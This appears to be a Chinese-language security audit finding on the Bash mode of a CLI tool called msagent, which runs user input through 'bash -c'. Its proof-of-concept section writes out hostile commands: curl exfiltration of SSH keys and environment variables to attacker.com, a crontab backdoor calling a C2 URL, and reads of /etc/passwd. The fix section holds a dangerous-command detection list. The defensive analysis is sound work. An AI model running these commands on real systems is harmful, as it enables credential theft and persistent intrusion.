# VULN-DF-UTILS-001：run_async_command函数shell命令注入致任意代码执行

## 漏洞概述

| 属性 | 值 |
|------|-----|
| **漏洞类型** | 命令注入 (Command Injection) |
| **CWE** | CWE-78: OS Command Injection |
| **严重性** | CRITICAL |
| **置信度** | 95% |
| **影响范围** | CLI 工具所有用户 |
| **漏洞文件** | `src/msagent/cli/handlers/bash.py:17-26` |

## 漏洞详情

### 技术分析

该漏洞存在于 `BashDispatcher.dispatch()` 方法中。用户通过 CLI 输入的命令字符串直接传递给 `execute_bash_command()` 函数，使用 `bash -c` 执行，没有任何输入验证或过滤。

**漏洞代码位置**:

```python
# src/msagent/cli/handlers/bash.py:17-26
async def dispatch(self, command: str) -> None:
    """Execute bash command and display output."""
    try:
        if not command.strip():
            return

        working_dir = str(self.session.context.working_dir)

        with console.console.status(f"[{theme.spinner_color}]Running...[/{theme.spinner_color}]") as status:
            returncode, stdout, stderr = await execute_bash_command(["bash", "-c", command], cwd=working_dir)
            status.stop()
```

**底层执行逻辑** (`src/msagent/utils/bash.py:104-120`):

```python
async def execute_bash_command(
    command: list[str], cwd: str | None = None, timeout: int | None = None
) -> tuple[int, str, str]:
    process = None
    # ...
    try:
        process = await asyncio.create_subprocess_exec(
            *command,  # 直接展开命令参数
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
            cwd=cwd,
            **_subprocess_spawn_kwargs(),
        )
```

### 数据流分析

```
用户输入 (CLI stdin)
    ↓
Session.run() [session.py]
    ↓
BashDispatcher.dispatch(command) [bash.py:17]
    ↓
execute_bash_command(["bash", "-c", command]) [bash.py:26]
    ↓
asyncio.create_subprocess_exec(*command) [bash.py:114]
    ↓
Shell 进程执行
```

## 攻击场景

### 场景描述

这是一个 CLI 工具的 Bash 模式功能，允许用户直接执行 shell 命令。攻击场景如下：

**前提条件**:
1. 用户已启动 CLI 工具并进入 Bash 模式
2. CLI 工具正在运行中
3. 用户具有本地系统访问权限

**攻击路径**:
1. 用户输入任意 shell 命令
2. 命令通过 `bash -c` 直接执行
3. 命令在当前工作目录下执行

### 安全边界分析

**关键问题**: 这是否属于漏洞还是设计特性？

- **设计特性视角**: 这是一个 CLI 工具的 Bash 模式，允许用户在自己的系统上执行命令，类似于终端模拟器
- **漏洞视角**: 没有任何命令验证、权限检查或沙箱隔离，可能被滥用执行危险操作

**实际风险评估**:
- 如果用户是系统管理员或开发者 → **低风险**（预期行为）
- 如果 CLI 工具被远程用户控制 → **高风险**（命令注入）
- 如果在 Web API 模式下触发 → **高风险**（远程命令执行）

## PoC 构造

### 本地命令执行验证

```bash
# 启动 CLI 工具
python run.py

# 进入 Bash 模式后输入任意命令
$ rm -rf /tmp/test
$ cat /etc/passwd
$ curl http://attacker.com/exfil?data=$(cat ~/.ssh/id_rsa)
```

### 潜在危险命令示例

```bash
# 1. 敏感文件读取
cat ~/.ssh/id_rsa
cat ~/.bash_history

# 2. 数据泄露
curl http://attacker.com/?data=$(env | base64)

# 3. 持久化攻击
echo '*/5 * * * * curl http://attacker.com/c2' | crontab -

# 4. 权限提升（如果存在 SUID 等漏洞）
find / -perm -4000 2>/dev/null
```

## 影响评估

### 可能后果

| 风险类型 | 描述 | 严重程度 |
|----------|------|----------|
| **数据泄露** | 读取敏感文件（SSH 密钥、配置、历史记录） | 高 |
| **系统破坏** | 删除文件、修改系统配置 | 高 |
| **远程控制** | 安装后门、C2 连接 | 高 |
| **权限提升** | 利用系统漏洞提权 | 中 |
| **横向移动** | 在多用户环境中访问其他用户数据 | 中 |

### 受影响资产

- 用户本地文件系统
- 用户环境变量（可能包含 API 密钥）
- 用户 SSH 密钥和凭证
- 系统配置文件（用户有读取权限）
- 任何用户权限范围内的资源

## 修复建议

### 1. 命令白名单机制

```python
# 建议实现：允许的命令白名单
ALLOWED_COMMANDS = {
    'ls', 'cat', 'pwd', 'echo', 'grep', 'find',
    'git', 'python', 'npm', 'docker',  # 开发工具
}

async def dispatch(self, command: str) -> None:
    # 解析命令基础部分
    base_cmd = command.split()[0] if command.strip() else ''
    
    # 白名单检查
    if base_cmd not in ALLOWED_COMMANDS:
        console.print_error(f"Command '{base_cmd}' not allowed")
        return
    
    # 执行...
```

### 2. 命令审核机制

```python
# 建议实现：危险命令检测
DANGEROUS_PATTERNS = [
    r'\brm\s+-rf\b',
    r'\bchmod\b',
    r'\bsudo\b',
    r'\bcurl\b.*\bhttp\b',
    r'\bwget\b',
    r'>\s*/etc/',
    r'\|\s*bash',
]

async def dispatch(self, command: str) -> None:
    import re
    for pattern in DANGEROUS_PATTERNS:
        if re.search(pattern, command):
            # 要求用户确认
            if not await self._confirm_dangerous_command(command):
                return
    # 执行...
```

### 3. 沙箱隔离

```python
# 建议实现：使用沙箱执行
async def dispatch(self, command: str) -> None:
    # 在沙箱环境中执行
    sandbox_config = {
        'readonly_paths': ['/etc', '/usr', '/bin'],
        'writable_paths': [str(self.session.context.working_dir)],
        'network': False,  # 禁止网络访问
    }
    
    # 使用 bubblewrap 或 seatbelt 执行
    returncode, stdout, stderr = await execute_bash_command_sandboxed(
        command, 
        cwd=working_dir,
        sandbox=sandbox_config
    )
```

### 4. 用户确认机制

```python
# 建议实现：危险操作确认
async def dispatch(self, command: str) -> None:
    # 检测危险命令
    if self._is_dangerous_command(command):
        console.print_warning(f"⚠️  Dangerous command detected: {command}")
        if not await self._prompt_confirmation("Execute anyway?"):
            console.print_info("Command cancelled")
            return
    
    # 执行...
```

## 相关代码

### 漏洞函数完整代码

```python
# src/msagent/cli/handlers/bash.py (完整文件)
"""Bash command execution dispatcher."""

from msagent.cli.theme import console, theme
from msagent.core.logging import get_logger
from msagent.utils.bash import execute_bash_command

logger = get_logger(__name__)


class BashDispatcher:
    """Handles bash command execution."""

    def __init__(self, session) -> None:
        """Initialize with reference to CLI session."""
        self.session = session

    async def dispatch(self, command: str) -> None:
        """Execute bash command and display output."""
        try:
            if not command.strip():
                return

            working_dir = str(self.session.context.working_dir)

            with console.console.status(f"[{theme.spinner_color}]Running...[/{theme.spinner_color}]") as status:
                returncode, stdout, stderr = await execute_bash_command(["bash", "-c", command], cwd=working_dir)
                status.stop()

            if stdout:
                console.console.print(stdout.rstrip())

            if stderr:
                console.print_error(stderr.rstrip())

            if returncode != 0:
                console.print_error(f"Command exited with code {returncode}")

            console.print("")

        except ValueError as e:
            console.print_error(f"Invalid command syntax: {e}")
            console.print("")
        except Exception as e:
            console.print_error(f"Error executing command: {e}")
            console.print("")
            logger.debug("Bash handler error", exc_info=True)
```

### 命令执行底层函数

```python
# src/msagent/utils/bash.py:104-132 (核心执行逻辑)
async def execute_bash_command(
    command: list[str], cwd: str | None = None, timeout: int | None = None
) -> tuple[int, str, str]:
    process = None
    stdout_task: asyncio.Task[None] | None = None
    stderr_task: asyncio.Task[None] | None = None
    stdout_buffer = bytearray()
    stderr_buffer = bytearray()

    try:
        process = await asyncio.create_subprocess_exec(
            *command,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
            cwd=cwd,
            **_subprocess_spawn_kwargs(),
        )

        stdout_task = asyncio.create_task(_pump_stream(process.stdout, stdout_buffer))
        stderr_task = asyncio.create_task(_pump_stream(process.stderr, stderr_buffer))

        await asyncio.wait_for(process.wait(), timeout=timeout)
        await _finish_stream_tasks([stdout_task, stderr_task])

        return (
            process.returncode or 0,
            stdout_buffer.decode("utf-8", errors="replace"),
            stderr_buffer.decode("utf-8", errors="replace"),
        )
    # ... exception handling
```

## 参考资料

- [CWE-78: OS Command Injection](https://cwe.mitre.org/data/definitions/78.html)
- [OWASP Command Injection](https://owasp.org/www-community/attacks/Command_Injection)
- [Python subprocess Security Best Practices](https://docs.python.org/3/library/subprocess.html#security-considerations)

## 结论

该漏洞是 CLI 工具 Bash 模式的核心功能实现。从技术角度，这是一个完整的命令注入路径。但从使用场景角度，这可能是设计特性（允许用户在自己的系统上执行命令）。

**建议**:
1. 添加明确的文档说明 Bash 模式的安全边界
2. 实现可选的安全控制（命令白名单、危险命令确认）
3. 确保该功能仅在本地 CLI 模式下可用，不在 Web API 模式下暴露
4. 添加审计日志记录所有执行的命令